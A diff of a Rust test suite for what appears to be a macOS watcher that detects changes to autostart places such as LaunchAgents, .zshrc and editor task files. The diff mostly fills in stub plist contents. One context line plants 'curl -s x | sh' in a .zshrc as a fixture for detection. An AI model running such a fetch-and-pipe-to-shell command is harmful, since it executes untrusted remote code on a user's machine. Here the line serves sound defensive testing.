@@ -606,7 +606,10 @@ fn a_first_file_created_in_a_folder_that_did_not_exist_at_start_is_seen() {
     // The first autostart item ever made: neither the folder nor its parent is there.
     let mac = Mac::new("later");
     let mut w = mac.watch().started();
-    mac.put("Library/LaunchAgents/com.example.agent.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/com.example.agent.plist",
+        "<plist><dict/></plist>\n",
+    );
     let read = w.until("read", |v| count(v, "new") == 1);
     assert_eq!(count(&read, "changed"), 0);
     assert_eq!(
@@ -659,7 +662,7 @@ fn a_thousand_changes_are_one_reading() {
     for i in 0..1000 {
         mac.put(
             &format!("Library/LaunchAgents/item-{i}.plist"),
-            "<plist/>\n",
+            "<plist><dict/></plist>\n",
         );
     }
     let burst = next_read(&mut w);
@@ -678,7 +681,10 @@ fn every_start_reads_every_place_a_change_made_while_stopped_is_found_and_none_i
     // store says of earlier watchers: what changed while none ran is in it.
     let mac = Mac::new("restart");
     mac.put(".zshrc", "one\n");
-    mac.put("Library/LaunchAgents/org.example.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/org.example.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     let w = mac.watch().started();
     assert!(w.stop().success());
     mac.put(".zshrc", "two\n");
@@ -902,7 +908,10 @@ fn a_place_that_cannot_be_subscribed_to_is_a_problem_line_and_the_rest_is_still_
         TABLE_PLACES + HOME_PLACES
     );
     // An autostart item: its kind of place reads in full here, so it has a baseline.
-    mac.put("Library/LaunchAgents/seen.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/seen.plist",
+        "<plist><dict/></plist>\n",
+    );
     w.until("read", |v| count(v, "new") == 1);
 }
 
@@ -955,7 +964,10 @@ fn a_place_left_unsubscribed_is_not_watched_live_until_a_later_subscription_take
         "the page says calm"
     );
     // The places it subscribed to are still watched.
-    mac.put("Library/LaunchAgents/seen.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/seen.plist",
+        "<plist><dict/></plist>\n",
+    );
     w.until("read", |v| count(v, "new") == 1);
 
     // The next look at what to watch subscribes to it, and the reading after it ends the failure.
@@ -1769,7 +1781,10 @@ fn lived_in(tag: &str) -> Mac {
         );
     }
     mac.put("dev/shop/.vscode/tasks.json", ON_OPEN);
-    mac.put("Library/LaunchAgents/com.invented.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/com.invented.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     mac.put(".zshrc", "export PATH=\"$HOME/bin:$PATH\"\n");
     mac.put(
         ".claude/settings.json",
@@ -1875,7 +1890,7 @@ fn after_the_first_check_what_appears_in_a_project_or_the_home_folder_is_found_i
         mac.put("dev/api/.vscode/tasks.json", ON_OPEN);
         mac.put(
             "Library/LaunchAgents/com.invented.other.plist",
-            "<plist/>\n",
+            "<plist><dict/></plist>\n",
         );
         mac.put("dev/new/.git/HEAD", "ref: refs/heads/main\n");
         mac.put(
@@ -1962,7 +1977,7 @@ fn what_changes_between_the_watchers_first_reading_and_the_first_check_where_the
     assert!(mac.watch().started().stop().success());
     mac.put(
         "Library/LaunchAgents/com.invented.other.plist",
-        "<plist/>\n",
+        "<plist><dict/></plist>\n",
     );
     mac.put(".zshrc", "curl -s x | sh\n");
     mac.put(
@@ -1995,7 +2010,10 @@ fn a_place_the_watcher_read_first_after_the_first_check_is_told_once_and_what_ap
     // read the folder before.
     let mac = Mac::new("watcher-baseline");
     let agents = mac.home().join("Library/LaunchAgents");
-    mac.put("Library/LaunchAgents/com.invented.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/com.invented.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     {
         use std::os::unix::fs::PermissionsExt;
         std::fs::set_permissions(&agents, std::fs::Permissions::from_mode(0o000)).unwrap();
@@ -2006,7 +2024,7 @@ fn a_place_the_watcher_read_first_after_the_first_check_is_told_once_and_what_ap
     assert!(mac.watch().started().stop().success());
     mac.put(
         "Library/LaunchAgents/com.invented.other.plist",
-        "<plist/>\n",
+        "<plist><dict/></plist>\n",
     );
     mac.run();
     assert_eq!(
@@ -2083,7 +2101,7 @@ fn a_link_in_a_watched_place_is_followed_and_a_change_at_its_target_is_seen() {
     let target = mac.put("dotfiles/zshrc", "one\n");
     std::os::unix::fs::symlink(&target, mac.home().join(".zshrc")).unwrap();
     // A launch agent kept elsewhere and linked into the folder of launch agents.
-    let agent = mac.put("tools/agent.plist", "<plist/>\n");
+    let agent = mac.put("tools/agent.plist", "<plist><dict/></plist>\n");
     let agents = mac.home().join("Library/LaunchAgents");
     std::fs::create_dir_all(&agents).unwrap();
     std::os::unix::fs::symlink(&agent, agents.join("tool.plist")).unwrap();
@@ -2091,7 +2109,10 @@ fn a_link_in_a_watched_place_is_followed_and_a_change_at_its_target_is_seen() {
     mac.put("dotfiles/zshrc", "two\n");
     w.until("read", |v| count(v, "changed") == 1);
     assert_eq!(mac.journaled(".zshrc", "changed"), vec!["has_content"]);
-    mac.put("tools/agent.plist", "<plist>changed</plist>\n");
+    mac.put(
+        "tools/agent.plist",
+        "<plist><dict><key>Changed</key><true/></dict></plist>\n",
+    );
     w.until("read", |v| count(v, "changed") == 1);
     assert_eq!(
         mac.journaled("Library/LaunchAgents/tool.plist", "changed"),
@@ -2902,7 +2923,7 @@ fn a_quiet_mac_needs_no_look_whatever_is_not_covered_and_a_planted_change_does()
     // A program set to start by itself, planted: the one thing that needs a look.
     mac.put(
         "Library/LaunchAgents/com.example.planted.plist",
-        "<plist/>\n",
+        "<plist><dict/></plist>\n",
     );
     let out = mac.run_cmd_servers(&servers).output().unwrap();
     assert!(out.status.success());
@@ -3577,7 +3598,10 @@ fn a_change_in_one_watched_place_reads_again_only_its_reading_and_every_other_ke
     use std::os::unix::fs::symlink;
     let mac = Mac::new("touched");
     mac.put(".zshrc", "export A=1\n");
-    mac.put("Library/LaunchAgents/org.example.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/org.example.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     mac.put("Documents/ssh/config", "Host web\n");
     symlink(mac.home().join("Documents/ssh"), mac.home().join(".ssh")).unwrap();
     let mut w = mac.watch().started();
@@ -3678,7 +3702,10 @@ fn a_watcher_started_again_reads_every_place_at_its_first_reading_however_small_
     // one started again, which goes on from the history FSEvents kept, has not read them yet.
     let mac = Mac::new("again-all");
     mac.put(".zshrc", "one\n");
-    mac.put("Library/LaunchAgents/org.example.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/org.example.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     assert!(mac.watch().started().stop().success());
     let before = latest_watched(&mac);
     let last_read = "SELECT CAST(last_read AS TEXT) FROM watcher";
@@ -3712,7 +3739,10 @@ fn changes_in_two_places_that_come_before_the_reading_is_due_are_both_read() {
     mac.put(".zshrc", "two\n");
     // Long enough for FSEvents to deliver the first change on its own, short of the quiet second.
     std::thread::sleep(Duration::from_millis(500));
-    mac.put("Library/LaunchAgents/org.example.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/org.example.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     let seen = std::cell::Cell::new((0, 0));
     w.until("read", |v| {
         let (changed, new) = seen.get();
@@ -3730,7 +3760,10 @@ fn a_reading_of_some_places_between_two_of_every_place_saves_no_second_copy_of_a
     let mac = Mac::new("raw-apart");
     mac.put(".zshrc", "export A=1\n");
     // A place the reading of some places does not list.
-    mac.put("Library/LaunchAgents/org.example.sync.plist", "<plist/>\n");
+    mac.put(
+        "Library/LaunchAgents/org.example.sync.plist",
+        "<plist><dict/></plist>\n",
+    );
     let copies = |mac: &Mac| {
         std::fs::read_dir(mac.store().with_file_name("raw"))
             .unwrap()
@@ -3792,7 +3825,10 @@ fn a_file_one_reading_reaches_by_a_name_in_another_case_is_read_again_by_the_nex
     // the file as it is on the disk, which is in the launch agents' place only.
     use std::os::unix::fs::symlink;
     let mac = Mac::new("other-case");
-    let file = mac.put("Library/LaunchAgents/helper.plist", "<plist/>\n");
+    let file = mac.put(
+        "Library/LaunchAgents/helper.plist",
+        "<plist><dict/></plist>\n",
+    );
     let link = mac.home().join("LIBRARY/LaunchAgents/helper.plist");
     symlink(link, mac.home().join(".zshrc")).unwrap();
     let mut w = looking(&mac);
@@ -3806,7 +3842,10 @@ fn a_file_one_reading_reaches_by_a_name_in_another_unicode_form_is_read_again_by
     // the file system takes as one name.
     use std::os::unix::fs::symlink;
     let mac = Mac::new("other-form");
-    let file = mac.put("Library/LaunchAgents/cafe\u{301}.plist", "<plist/>\n");
+    let file = mac.put(
+        "Library/LaunchAgents/cafe\u{301}.plist",
+        "<plist><dict/></plist>\n",
+    );
     let link = mac.home().join("Library/LaunchAgents/caf\u{e9}.plist");
     symlink(link, mac.home().join(".zshrc")).unwrap();
     let mut w = looking(&mac);
@@ -3906,7 +3945,10 @@ fn a_reading_of_every_place_owed_when_the_watcher_stops_is_made_after_it_starts_
     // stops before its next look, as when the app quits or the Mac restarts.
     use std::os::unix::fs::symlink;
     let mac = Mac::new("owed-restart");
-    let file = mac.put("Library/LaunchAgents/helper.plist", "<plist/>\n");
+    let file = mac.put(
+        "Library/LaunchAgents/helper.plist",
+        "<plist><dict/></plist>\n",
+    );
     let link = mac.home().join("LIBRARY/LaunchAgents/helper.plist");
     symlink(link, mac.home().join(".zshrc")).unwrap();
     let mut w = not_looking(&mac);
